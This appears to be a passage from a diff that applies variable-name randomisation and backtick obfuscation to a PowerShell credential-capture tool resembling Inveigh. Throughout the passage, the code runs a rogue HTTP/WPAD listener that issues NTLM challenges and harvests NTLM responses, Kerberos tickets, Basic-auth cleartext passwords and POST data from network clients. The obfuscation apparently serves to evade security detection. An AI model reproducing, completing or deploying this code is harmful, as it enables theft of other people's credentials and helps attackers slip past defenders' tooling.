+                $gtWJOTknRyHoQUPpqdcgydUMysQll.AuthenticateAsServer($BoBReZfkJaXxbGPuKOYhIeMtLuzQmigSbFnUQJaWqnAZ,$false,[System.Security.Authentication.SslProtocols]::Default,$false)
             }
             else
             {
-                $GrateSpicy = $SnatchStamp.GetStream()
+                $gtWJOTknRyHoQUPpqdcgydUMysQll = $oEDthgkOuxICsdYQvYdGTkYvIMBsDdxIveOAttIpTde.GetStream()
             }
             
         }
 
-        if($HugeDead)
+        if($TlvcCDlGUgNUeGiPhbVgt)
         {
-            [Byte[]]$WantPeel = $null
+            [Byte[]]$ICrDotyZRcCVvjcxWYfTKRkTUkmhEYXvEOcnGQW = $null
 
-            while($VastRainy.DataAvailable)
+            while($kjtZeCuHNQxvWYqhKLTGjCHhKnW.DataAvailable)
             {
-                $BabyGrubby = $GrateSpicy.Read($RemoveClass,0,$RemoveClass.Length)
-                $WantPeel += $RemoveClass[0..($BabyGrubby - 1)]
+                $XdWVgjvZfXqldrpiYjYNoeByJDybjEUtWOgjB = $gtWJOTknRyHoQUPpqdcgydUMysQll.Read($dvRxTlPCfpXtZaRYXOQZjknNRCZGJeL,0,$dvRxTlPCfpXtZaRYXOQZjknNRCZGJeL.Length)
+                $ICrDotyZRcCVvjcxWYfTKRkTUkmhEYXvEOcnGQW += $dvRxTlPCfpXtZaRYXOQZjknNRCZGJeL[0..($XdWVgjvZfXqldrpiYjYNoeByJDybjEUtWOgjB - 1)]
             }
 
-            $VulgarBoard = [System.BitConverter]::ToString($WantPeel)
+            $DewgFMbDmWRIFfvhuczeVlvJdbUx = [System.BitConverter]::ToString($ICrDotyZRcCVvjcxWYfTKRkTUkmhEYXvEOcnGQW)
         }
         else
         {
 
-            while($GrateSpicy.DataAvailable)
+            while($gtWJOTknRyHoQUPpqdcgydUMysQll.DataAvailable)
             {
-                $GrateSpicy.Read($RemoveClass,0,$RemoveClass.Length) > $null
+                $gtWJOTknRyHoQUPpqdcgydUMysQll.Read($dvRxTlPCfpXtZaRYXOQZjknNRCZGJeL,0,$dvRxTlPCfpXtZaRYXOQZjknNRCZGJeL.Length) > $null
             }
 
-            $VulgarBoard = [System.BitConverter]::ToString($RemoveClass)
+            $DewgFMbDmWRIFfvhuczeVlvJdbUx = [System.BitConverter]::ToString($dvRxTlPCfpXtZaRYXOQZjknNRCZGJeL)
         }
         
-        if($VulgarBoard -like "47-45-54-20*" -or $VulgarBoard -like "48-45-41-44-20*" -or $VulgarBoard -like "4f-50-54-49-4f-4e-53-20*" -or $VulgarBoard -like "43-4f-4e-4e-45-43-54*" -or $VulgarBoard -like "50-4f-53-54*")
+        if($DewgFMbDmWRIFfvhuczeVlvJdbUx -like "47-45-54-20*" -or $DewgFMbDmWRIFfvhuczeVlvJdbUx -like "48-45-41-44-20*" -or $DewgFMbDmWRIFfvhuczeVlvJdbUx -like "4f-50-54-49-4f-4e-53-20*" -or $DewgFMbDmWRIFfvhuczeVlvJdbUx -like "43-4f-4e-4e-45-43-54*" -or $DewgFMbDmWRIFfvhuczeVlvJdbUx -like "50-4f-53-54*")
         {
-            $TurkeyNarrow = $VulgarBoard.Substring($VulgarBoard.IndexOf("-20-") + 4,$VulgarBoard.Substring($VulgarBoard.IndexOf("-20-") + 1).IndexOf("-20-") - 3)
-            $TurkeyNarrow = $TurkeyNarrow.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
-            $StewGun = ne`w-`obje`ct System.String ($TurkeyNarrow,0,$TurkeyNarrow.Length)
-            $SpringBorder = $SnatchStamp.Client.RemoteEndpoint.Address.IPAddressToString
-            $ForkNeed = $SnatchStamp.Client.RemoteEndpoint.Port
-            $SaveJuggle = $true
+            $TSYFwtihlrpejeOuoelNkJVFf = $DewgFMbDmWRIFfvhuczeVlvJdbUx.Substring($DewgFMbDmWRIFfvhuczeVlvJdbUx.IndexOf("-20-") + 4,$DewgFMbDmWRIFfvhuczeVlvJdbUx.Substring($DewgFMbDmWRIFfvhuczeVlvJdbUx.IndexOf("-20-") + 1).IndexOf("-20-") - 3)
+            $TSYFwtihlrpejeOuoelNkJVFf = $TSYFwtihlrpejeOuoelNkJVFf.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+            $RAeAsyRlMmNDrLzlWwuSnkKcuSpPKfi = ne`w`-`ob`je`ct System.String ($TSYFwtihlrpejeOuoelNkJVFf,0,$TSYFwtihlrpejeOuoelNkJVFf.Length)
+            $tYqNqMYlIzEmrvCHkHYdIInEeoaqWt = $oEDthgkOuxICsdYQvYdGTkYvIMBsDdxIveOAttIpTde.Client.RemoteEndpoint.Address.IPAddressToString
+            $WuvalrywzyDlyeBEMutCBYyjF = $oEDthgkOuxICsdYQvYdGTkYvIMBsDdxIveOAttIpTde.Client.RemoteEndpoint.Port
+            $FyrcUKtqiRjGEsgGrhOBOXPYrMvFi = $true
 
-            if(($VulgarBoard).StartsWith("47-45-54-20"))
+            if(($DewgFMbDmWRIFfvhuczeVlvJdbUx).StartsWith("47-45-54-20"))
             {
-                $ColourClass = "GET"
+                $ooHgBaekCDSNdBXevilssBJxd = "GET"
             }
-            elseif(($VulgarBoard).StartsWith("48-45-41-44-20"))
+            elseif(($DewgFMbDmWRIFfvhuczeVlvJdbUx).StartsWith("48-45-41-44-20"))
             {
-                $ColourClass = "HEAD"
+                $ooHgBaekCDSNdBXevilssBJxd = "HEAD"
             }
-            elseif(($VulgarBoard).StartsWith("4f-50-54-49-4F-4E-53-20"))
+            elseif(($DewgFMbDmWRIFfvhuczeVlvJdbUx).StartsWith("4f-50-54-49-4F-4E-53-20"))
             {
-                $ColourClass = "OPTIONS"
+                $ooHgBaekCDSNdBXevilssBJxd = "OPTIONS"
             }
-            elseif(($VulgarBoard).StartsWith("43-4F-4E-4E-45-43-54"))
+            elseif(($DewgFMbDmWRIFfvhuczeVlvJdbUx).StartsWith("43-4F-4E-4E-45-43-54"))
             {
-                $ColourClass = "CONNECT"
+                $ooHgBaekCDSNdBXevilssBJxd = "CONNECT"
             }
-            elseif(($VulgarBoard).StartsWith("50-4F-53-54-20"))
+            elseif(($DewgFMbDmWRIFfvhuczeVlvJdbUx).StartsWith("50-4F-53-54-20"))
             {
-                $ColourClass = "POST"
+                $ooHgBaekCDSNdBXevilssBJxd = "POST"
             }
             
-            if($MournMean)
+            if($NRfqdntsPZobtiOhhrmgkqIltwHFxMIQcgwzNxjPu)
             {
-                $LightOval.NBNS_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
-                $LightOval.hostname_spoof = $true
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NBNS_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.hostname_spoof = $true
             }
 
-            if($VulgarBoard -like "*-48-6F-73-74-3A-20-*")
+            if($DewgFMbDmWRIFfvhuczeVlvJdbUx -like "*-48-6F-73-74-3A-20-*")
             {
-                $BuryPlate = $VulgarBoard.Substring($VulgarBoard.IndexOf("-48-6F-73-74-3A-20-") + 19)
-                $BuryPlate = $BuryPlate.Substring(0,$BuryPlate.IndexOf("-0D-0A-"))
-                $BuryPlate = $BuryPlate.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
-                $PartPlucky = ne`w-`obje`ct System.String ($BuryPlate,0,$BuryPlate.Length)
+                $ezIEJrTUAuAwMHSMBqalCBwKgMtIOVsMvalIXVnGHO = $DewgFMbDmWRIFfvhuczeVlvJdbUx.Substring($DewgFMbDmWRIFfvhuczeVlvJdbUx.IndexOf("-48-6F-73-74-3A-20-") + 19)
+                $ezIEJrTUAuAwMHSMBqalCBwKgMtIOVsMvalIXVnGHO = $ezIEJrTUAuAwMHSMBqalCBwKgMtIOVsMvalIXVnGHO.Substring(0,$ezIEJrTUAuAwMHSMBqalCBwKgMtIOVsMvalIXVnGHO.IndexOf("-0D-0A-"))
+                $ezIEJrTUAuAwMHSMBqalCBwKgMtIOVsMvalIXVnGHO = $ezIEJrTUAuAwMHSMBqalCBwKgMtIOVsMvalIXVnGHO.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+                $RccpaskStAKspwngsFTkmEZLUtqlhaHyRv = ne`w`-`ob`je`ct System.String ($ezIEJrTUAuAwMHSMBqalCBwKgMtIOVsMvalIXVnGHO,0,$ezIEJrTUAuAwMHSMBqalCBwKgMtIOVsMvalIXVnGHO.Length)
             }
 
-            if($VulgarBoard -like "*-55-73-65-72-2D-41-67-65-6E-74-3A-20-*")
+            if($DewgFMbDmWRIFfvhuczeVlvJdbUx -like "*-55-73-65-72-2D-41-67-65-6E-74-3A-20-*")
             {
-                $PlaneGrain = $VulgarBoard.Substring($VulgarBoard.IndexOf("-55-73-65-72-2D-41-67-65-6E-74-3A-20-") + 37)
-                $PlaneGrain = $PlaneGrain.Substring(0,$PlaneGrain.IndexOf("-0D-0A-"))
-                $PlaneGrain = $PlaneGrain.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
-                $LovelyMother = ne`w-`obje`ct System.String ($PlaneGrain,0,$PlaneGrain.Length)
+                $viwSHepJkITCagWUDyeWLpZLlTZFUnho = $DewgFMbDmWRIFfvhuczeVlvJdbUx.Substring($DewgFMbDmWRIFfvhuczeVlvJdbUx.IndexOf("-55-73-65-72-2D-41-67-65-6E-74-3A-20-") + 37)
+                $viwSHepJkITCagWUDyeWLpZLlTZFUnho = $viwSHepJkITCagWUDyeWLpZLlTZFUnho.Substring(0,$viwSHepJkITCagWUDyeWLpZLlTZFUnho.IndexOf("-0D-0A-"))
+                $viwSHepJkITCagWUDyeWLpZLlTZFUnho = $viwSHepJkITCagWUDyeWLpZLlTZFUnho.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+                $gHKQMITNsnGlDwlGjzuxfFxqVihtRtQxNMvpLEgFaKxF = ne`w`-`ob`je`ct System.String ($viwSHepJkITCagWUDyeWLpZLlTZFUnho,0,$viwSHepJkITCagWUDyeWLpZLlTZFUnho.Length)
             }
 
-            if($FruitBridge -ne $StewGun -or $QuackTickle -ne $SnatchStamp.Client.Handle)
+            if($gpWhWDWUsdNZYwHULyhboSHfGSOaFFzwjoEDasoqVt -ne $RAeAsyRlMmNDrLzlWwuSnkKcuSpPKfi -or $szPvEgzDwvzLSORtknunBQhQWPRkalfptseoZAmxTtHaT -ne $oEDthgkOuxICsdYQvYdGTkYvIMBsDdxIveOAttIpTde.Client.Handle)
             {
-                $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] $FlagBolt($LunchCheat) $ColourClass request for $StewGun received from $SpringBorder`:$ForkNeed") > $null
-                $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] $FlagBolt($LunchCheat) host header $PartPlucky received from $SpringBorder`:$ForkNeed") > $null
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] $HVlqawqqFHiCxsbfiRKPAt($LwDfsPrfdttvoEsdSBgdEUwjBXpltVybimvJb) $ooHgBaekCDSNdBXevilssBJxd request for $RAeAsyRlMmNDrLzlWwuSnkKcuSpPKfi received from $tYqNqMYlIzEmrvCHkHYdIInEeoaqWt`:$WuvalrywzyDlyeBEMutCBYyjF") > $null
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] $HVlqawqqFHiCxsbfiRKPAt($LwDfsPrfdttvoEsdSBgdEUwjBXpltVybimvJb) host header $RccpaskStAKspwngsFTkmEZLUtqlhaHyRv received from $tYqNqMYlIzEmrvCHkHYdIInEeoaqWt`:$WuvalrywzyDlyeBEMutCBYyjF") > $null
 
-                if($LovelyMother)
+                if($gHKQMITNsnGlDwlGjzuxfFxqVihtRtQxNMvpLEgFaKxF)
                 {
-                    $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] $FlagBolt($LunchCheat) user agent received from $SpringBorder`:$ForkNeed`:`n$LovelyMother") > $null
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] $HVlqawqqFHiCxsbfiRKPAt($LwDfsPrfdttvoEsdSBgdEUwjBXpltVybimvJb) user agent received from $tYqNqMYlIzEmrvCHkHYdIInEeoaqWt`:$WuvalrywzyDlyeBEMutCBYyjF`:`n$gHKQMITNsnGlDwlGjzuxfFxqVihtRtQxNMvpLEgFaKxF") > $null
                 }
 
-                if($JumpyWrench -eq 'Y' -and $ExpandNest.Count -gt 0 -and ($ExpandNest | Where-Object {$LovelyMother -match $_}))
+                if($QwSMzXPWnDpEnfpPpksOdTKwwVNMJkIdZB -eq 'Y' -and $eHhdMzJITQkHvLFvGvuaGszuwtoKkVctXVaSotDPalR.Count -gt 0 -and ($eHhdMzJITQkHvLFvGvuaGszuwtoKkVctXVaSotDPalR | Where-Object {$gHKQMITNsnGlDwlGjzuxfFxqVihtRtQxNMvpLEgFaKxF -match $_}))
                 {
-                    $LightOval.output_queue.Add("[*] [$(Get-Date -format s)] $FlagBolt($LunchCheat) ignoring wpad.dat request due to user agent match from $SpringBorder`:$ForkNeed") > $null
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[*] [$(Get-Date -format s)] $HVlqawqqFHiCxsbfiRKPAt($LwDfsPrfdttvoEsdSBgdEUwjBXpltVybimvJb) ignoring wpad.dat request due to user agent match from $tYqNqMYlIzEmrvCHkHYdIInEeoaqWt`:$WuvalrywzyDlyeBEMutCBYyjF") > $null
                 }
 
             }
 
-            if($VulgarBoard -like "*-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-*")
+            if($DewgFMbDmWRIFfvhuczeVlvJdbUx -like "*-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-*")
             {
-                $BasketMist = $VulgarBoard.Substring($VulgarBoard.IndexOf("-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-") + 46)
-                $BasketMist = $BasketMist.Substring(0,$BasketMist.IndexOf("-0D-0A-"))
-                $BasketMist = $BasketMist.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
-                $YearLick = ne`w-`obje`ct System.String ($BasketMist,0,$BasketMist.Length)
+                $kyEUeMKdFhhDVkKQWVbsFoMsNEyMmwrKWinkWadCeAF = $DewgFMbDmWRIFfvhuczeVlvJdbUx.Substring($DewgFMbDmWRIFfvhuczeVlvJdbUx.IndexOf("-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-") + 46)
+                $kyEUeMKdFhhDVkKQWVbsFoMsNEyMmwrKWinkWadCeAF = $kyEUeMKdFhhDVkKQWVbsFoMsNEyMmwrKWinkWadCeAF.Substring(0,$kyEUeMKdFhhDVkKQWVbsFoMsNEyMmwrKWinkWadCeAF.IndexOf("-0D-0A-"))
+                $kyEUeMKdFhhDVkKQWVbsFoMsNEyMmwrKWinkWadCeAF = $kyEUeMKdFhhDVkKQWVbsFoMsNEyMmwrKWinkWadCeAF.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+                $zHYYbzselKAvdZkoUeEgMYMAypwRrIvgsyZFBcSndD = ne`w`-`ob`je`ct System.String ($kyEUeMKdFhhDVkKQWVbsFoMsNEyMmwrKWinkWadCeAF,0,$kyEUeMKdFhhDVkKQWVbsFoMsNEyMmwrKWinkWadCeAF.Length)
             }
 
-            if(($StewGun -notmatch '/wpad.dat' -and $SkirtStone -eq 'Anonymous') -or ($StewGun -match '/wpad.dat' -and $LoadTrade -eq 'Anonymous') -or (
-            $StewGun -match '/wpad.dat' -and $LoadTrade -like 'NTLM*' -and $RobustFail.Count -gt 0 -and ($RobustFail | Where-Object {$LovelyMother -match $_})))
+            if(($RAeAsyRlMmNDrLzlWwuSnkKcuSpPKfi -notmatch '/wpad.dat' -and $SKVFmrXEfBIfxjyvDecjFzVZvkyOhdiApBpgWeXKPiyP -eq 'Anonymous') -or ($RAeAsyRlMmNDrLzlWwuSnkKcuSpPKfi -match '/wpad.dat' -and $QHapxkBOzdGDgKrNpoGOOUOrxeHqddKnclM -eq 'Anonymous') -or (
+            $RAeAsyRlMmNDrLzlWwuSnkKcuSpPKfi -match '/wpad.dat' -and $QHapxkBOzdGDgKrNpoGOOUOrxeHqddKnclM -like 'NTLM*' -and $LBwGGAkoRuUTfNJopnGziYvEpsmlXdMTqzqc.Count -gt 0 -and ($LBwGGAkoRuUTfNJopnGziYvEpsmlXdMTqzqc | Where-Object {$gHKQMITNsnGlDwlGjzuxfFxqVihtRtQxNMvpLEgFaKxF -match $_})))
             {
-                $NearVoice = 0x32,0x30,0x30
-                $FloatHarbor = 0x4f,0x4b
-                $DesireUnused = $true
+                $gGpIjkAKzuIRfHQszHDb = 0x32,0x30,0x30
+                $oeKzIwvAvNinvZrKsunpMXBeTjWBFvXvxavRSIJpSj = 0x4f,0x4b
+                $ZrMIvEFYTLFTbpUkrZSDZjzNxoreyslKac = $true
             }
             else
             {
 
-                if(($StewGun -match '/wpad.dat' -and $LoadTrade -eq 'NTLM') -or ($StewGun -notmatch '/wpad.dat' -and $SkirtStone -eq 'NTLM'))
+                if(($RAeAsyRlMmNDrLzlWwuSnkKcuSpPKfi -match '/wpad.dat' -and $QHapxkBOzdGDgKrNpoGOOUOrxeHqddKnclM -eq 'NTLM') -or ($RAeAsyRlMmNDrLzlWwuSnkKcuSpPKfi -notmatch '/wpad.dat' -and $SKVFmrXEfBIfxjyvDecjFzVZvkyOhdiApBpgWeXKPiyP -eq 'NTLM'))
                 {
-                    $MagicShiver = $true
+                    $bcfmkflRkYrxLgOmnIyMgyLZg = $true
                 }
                 else
                 {
-                    $MagicShiver = $false
+                    $bcfmkflRkYrxLgOmnIyMgyLZg = $false
                 }
 
-                if($SufferRefuse)
+                if($ZCWCfsgrcLUlJogmhFPdzZOB)
                 {
-                    $NearVoice = 0x34,0x30,0x37
-                    $CoatAttend = 0x50,0x72,0x6f,0x78,0x79,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20
+                    $gGpIjkAKzuIRfHQszHDb = 0x34,0x30,0x37
+                    $MPzYiQhaPJyyjamwcmaRjzP = 0x50,0x72,0x6f,0x78,0x79,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20
                 }
                 else
                 {
-                    $NearVoice = 0x34,0x30,0x31
-                    $CoatAttend = 0x57,0x57,0x57,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20
+                    $gGpIjkAKzuIRfHQszHDb = 0x34,0x30,0x31
+                    $MPzYiQhaPJyyjamwcmaRjzP = 0x57,0x57,0x57,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20
                 }
 
-                $FloatHarbor = 0x55,0x6e,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64
+                $oeKzIwvAvNinvZrKsunpMXBeTjWBFvXvxavRSIJpSj = 0x55,0x6e,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64
             }
             
-            if($VulgarBoard -like "50-4f-53-54*")
+            if($DewgFMbDmWRIFfvhuczeVlvJdbUx -like "50-4f-53-54*")
             {
-                $CakesFierce = $VulgarBoard.Substring($VulgarBoard.IndexOf("-0D-0A-0D-0A-") + 12)
-                $CakesFierce = $CakesFierce.Substring(0,$CakesFierce.IndexOf("-00-"))
-                $CakesFierce = $CakesFierce.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
-                $CallNumber = ne`w-`obje`ct System.String ($CakesFierce,0,$CakesFierce.Length)
+                $TrufSnWBRmykIKHHnxECZ = $DewgFMbDmWRIFfvhuczeVlvJdbUx.Substring($DewgFMbDmWRIFfvhuczeVlvJdbUx.IndexOf("-0D-0A-0D-0A-") + 12)
+                $TrufSnWBRmykIKHHnxECZ = $TrufSnWBRmykIKHHnxECZ.Substring(0,$TrufSnWBRmykIKHHnxECZ.IndexOf("-00-"))
+                $TrufSnWBRmykIKHHnxECZ = $TrufSnWBRmykIKHHnxECZ.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+                $gBHSXZrXxImhvVfZdoHbD = ne`w`-`ob`je`ct System.String ($TrufSnWBRmykIKHHnxECZ,0,$TrufSnWBRmykIKHHnxECZ.Length)
 
-                if($SlowRub -ne $CallNumber)
+                if($nayJHcfeatwSDjcaRqmdBuWTLZJHFdXxijMmCAPV -ne $gBHSXZrXxImhvVfZdoHbD)
                 {
-                    $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] $FlagBolt($LunchCheat) POST request $CallNumber captured from $SpringBorder`:$ForkNeed") > $null
-                    $LightOval.POST_request_file_queue.Add($CallNumber) > $null
-                    $LightOval.POST_request_list.Add($CallNumber) > $null
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] $HVlqawqqFHiCxsbfiRKPAt($LwDfsPrfdttvoEsdSBgdEUwjBXpltVybimvJb) POST request $gBHSXZrXxImhvVfZdoHbD captured from $tYqNqMYlIzEmrvCHkHYdIInEeoaqWt`:$WuvalrywzyDlyeBEMutCBYyjF") > $null
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.POST_request_file_queue.Add($gBHSXZrXxImhvVfZdoHbD) > $null
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.POST_request_list.Add($gBHSXZrXxImhvVfZdoHbD) > $null
                 }
 
-                $SlowRub = $CallNumber
+                $nayJHcfeatwSDjcaRqmdBuWTLZJHFdXxijMmCAPV = $gBHSXZrXxImhvVfZdoHbD
             }
             
-            if($YearLick.StartsWith('NTLM '))
+            if($zHYYbzselKAvdZkoUeEgMYMAypwRrIvgsyZFBcSndD.StartsWith('NTLM '))
             {
-                $YearLick = $YearLick -replace 'NTLM ',''
-                [Byte[]]$WinterDreary = [System.Convert]::FromBase64String($YearLick)
-                $SaveJuggle = $false
+                $zHYYbzselKAvdZkoUeEgMYMAypwRrIvgsyZFBcSndD = $zHYYbzselKAvdZkoUeEgMYMAypwRrIvgsyZFBcSndD -replace 'NTLM ',''
+                [Byte[]]$vQiIdoywRTMKydmIvdKAgLhP = [System.Convert]::FromBase64String($zHYYbzselKAvdZkoUeEgMYMAypwRrIvgsyZFBcSndD)
+                $FyrcUKtqiRjGEsgGrhOBOXPYrMvFi = $false
 
-                if([System.BitConverter]::ToString($WinterDreary[8..11]) -eq '01-00-00-00')
+                if([System.BitConverter]::ToString($vQiIdoywRTMKydmIvdKAgLhP[8..11]) -eq '01-00-00-00')
                 {
-                    $WindBone = Get-NTLMChallengeBase64 $HeavySmall $MagicShiver $SpringBorder $SnatchStamp.Client.RemoteEndpoint.Port
+                    $HYnEGzASViuUJzNoQskddNggVbRoI = Get-NTLMChallengeBase64 $xUlvMGNvOmaODuSVmfwndiKyNJVQvZCjtHWjFUWcWmBU $bcfmkflRkYrxLgOmnIyMgyLZg $tYqNqMYlIzEmrvCHkHYdIInEeoaqWt $oEDthgkOuxICsdYQvYdGTkYvIMBsDdxIveOAttIpTde.Client.RemoteEndpoint.Port
                 }
-                elseif([System.BitConverter]::ToString($WinterDreary[8..11]) -eq '03-00-00-00')
+                elseif([System.BitConverter]::ToString($vQiIdoywRTMKydmIvdKAgLhP[8..11]) -eq '03-00-00-00')
                 {
-                    Get-NTLMResponse $WinterDreary "Y" $SpringBorder $ForkNeed $LunchCheat $FlagBolt
-                    $NearVoice = 0x32,0x30,0x30
-                    $FloatHarbor = 0x4f,0x4b
-                    $DesireUnused = $true
-                    $EggsExist = $null
+                    Get-NTLMResponse $vQiIdoywRTMKydmIvdKAgLhP "Y" $tYqNqMYlIzEmrvCHkHYdIInEeoaqWt $WuvalrywzyDlyeBEMutCBYyjF $LwDfsPrfdttvoEsdSBgdEUwjBXpltVybimvJb $HVlqawqqFHiCxsbfiRKPAt
+                    $gGpIjkAKzuIRfHQszHDb = 0x32,0x30,0x30
+                    $oeKzIwvAvNinvZrKsunpMXBeTjWBFvXvxavRSIJpSj = 0x4f,0x4b
+                    $ZrMIvEFYTLFTbpUkrZSDZjzNxoreyslKac = $true
+                    $eXAKzprnnPiPECgCmrSMRcuHgJGyqXtOjE = $null
 
-                    if($SufferRefuse)
+                    if($ZCWCfsgrcLUlJogmhFPdzZOB)
                     {
                         
-                        if($YawnOdd -or $YummyShame)
+                        if($obcRRswvZXEpdnVKmVqxjHfaEIVMDzeLYwwAE -or $MslTACztzyXoaKHvwDiYETatjVpozshBYotjqUR)
                         {
-                            $MonthRare = 0x43,0x61,0x63,0x68,0x65,0x2d,0x43,0x6f,0x6e,0x74,0x72,0x6f,0x6c,0x3a,0x20,0x6e,0x6f,0x2d,0x63,0x61,0x63,0x68,0x65,0x2c,0x20,0x6e,0x6f,0x2d,0x73,0x74,0x6f,0x72,0x65
+                            $MpgtsHdqCNZyDGvEjyzaQSRzRAzhibxeZdRHZkzmwcMk = 0x43,0x61,0x63,0x68,0x65,0x2d,0x43,0x6f,0x6e,0x74,0x72,0x6f,0x6c,0x3a,0x20,0x6e,0x6f,0x2d,0x63,0x61,0x63,0x68,0x65,0x2c,0x20,0x6e,0x6f,0x2d,0x73,0x74,0x6f,0x72,0x65
                         }
                         else
                         {
-                            $LipSmall = $false
+                            $uYDwAMTYtBFOnonLzkvudmxMlvj = $false
                         }
 
                     }
@@ -3577,88 +3577,88 @@ $SwimChief =
                 }
                 else
                 {
-                    $DesireUnused = $true
+                    $ZrMIvEFYTLFTbpUkrZSDZjzNxoreyslKac = $true
                 }
 
             }
-            elseif($YearLick.StartsWith('Negotiate '))
+            elseif($zHYYbzselKAvdZkoUeEgMYMAypwRrIvgsyZFBcSndD.StartsWith('Negotiate '))
             {
-                $NearVoice = 0x32,0x30,0x30
-                $FloatHarbor = 0x4f,0x4b
-                $DesireUnused = $true
-                $YearLick = $YearLick -replace 'Negotiate ',''
-                [Byte[]]$WinterDreary = [System.Convert]::FromBase64String($YearLick)
-                $CactusGlow = [System.BitConverter]::ToString($WinterDreary)
-                $CactusGlow = $CactusGlow -replace "-",""
-                $HopFour = $CactusGlow.IndexOf("2A864886F7120102020100")
+                $gGpIjkAKzuIRfHQszHDb = 0x32,0x30,0x30
+                $oeKzIwvAvNinvZrKsunpMXBeTjWBFvXvxavRSIJpSj = 0x4f,0x4b
+                $ZrMIvEFYTLFTbpUkrZSDZjzNxoreyslKac = $true
+                $zHYYbzselKAvdZkoUeEgMYMAypwRrIvgsyZFBcSndD = $zHYYbzselKAvdZkoUeEgMYMAypwRrIvgsyZFBcSndD -replace 'Negotiate ',''
+                [Byte[]]$vQiIdoywRTMKydmIvdKAgLhP = [System.Convert]::FromBase64String($zHYYbzselKAvdZkoUeEgMYMAypwRrIvgsyZFBcSndD)
+                $AzuFCgFGXZKgFkeFoiGYDCqAncuKqp = [System.BitConverter]::ToString($vQiIdoywRTMKydmIvdKAgLhP)
+                $AzuFCgFGXZKgFkeFoiGYDCqAncuKqp = $AzuFCgFGXZKgFkeFoiGYDCqAncuKqp -replace "-",""
+                $hnZTXeNuLqsGcPhsfDXAQDIJvUMeegHMmPlquEjR = $AzuFCgFGXZKgFkeFoiGYDCqAncuKqp.IndexOf("2A864886F7120102020100")
 
-                if($HopFour -gt 0)
+                if($hnZTXeNuLqsGcPhsfDXAQDIJvUMeegHMmPlquEjR -gt 0)
                 {
-                    $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] $FlagBolt($LunchCheat) authentication method is Kerberos for $SpringBorder`:$ForkNeed") > $null
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] $HVlqawqqFHiCxsbfiRKPAt($LwDfsPrfdttvoEsdSBgdEUwjBXpltVybimvJb) authentication method is Kerberos for $tYqNqMYlIzEmrvCHkHYdIInEeoaqWt`:$WuvalrywzyDlyeBEMutCBYyjF") > $null
 
-                    if($HeapDetect -eq 'Y')
+                    if($fanhQcOeQBmoBotjLVUmvltLESsAfwuewvn -eq 'Y')
                     {
-                        $SaveJuggle = $false
-                        New-KerberosKirbi $WinterDreary $YummyCrowd $FlagBolt $LunchCheat "$SpringBorder`:$ForkNeed"
+                        $FyrcUKtqiRjGEsgGrhOBOXPYrMvFi = $false
+                        New-KerberosKirbi $vQiIdoywRTMKydmIvdKAgLhP $CgOGBlVwrTAUUWwYQzvrNoDcCeiMhHmDGRggrxFKuIq $HVlqawqqFHiCxsbfiRKPAt $LwDfsPrfdttvoEsdSBgdEUwjBXpltVybimvJb "$tYqNqMYlIzEmrvCHkHYdIInEeoaqWt`:$WuvalrywzyDlyeBEMutCBYyjF"
                     }
 
                 }
                 
             }
-            elseif($YearLick.Startswith('Basic '))
+            elseif($zHYYbzselKAvdZkoUeEgMYMAypwRrIvgsyZFBcSndD.Startswith('Basic '))
             {
-                $NearVoice = 0x32,0x30,0x30
-                $FloatHarbor = 0x4f,0x4b
-                $YearLick = $YearLick -replace 'Basic ',''
-                $NeedyMatch = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($YearLick))
-                $DesireUnused = $true
-                $LightOval.cleartext_file_queue.Add($NeedyMatch) > $null
-                $LightOval.cleartext_list.Add($NeedyMatch) > $null
-                $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] $FlagBolt($LunchCheat) Basic authentication cleartext credentials captured from $SpringBorder`:$ForkNeed`:") > $null
-                $LightOval.output_queue.Add($NeedyMatch) > $null
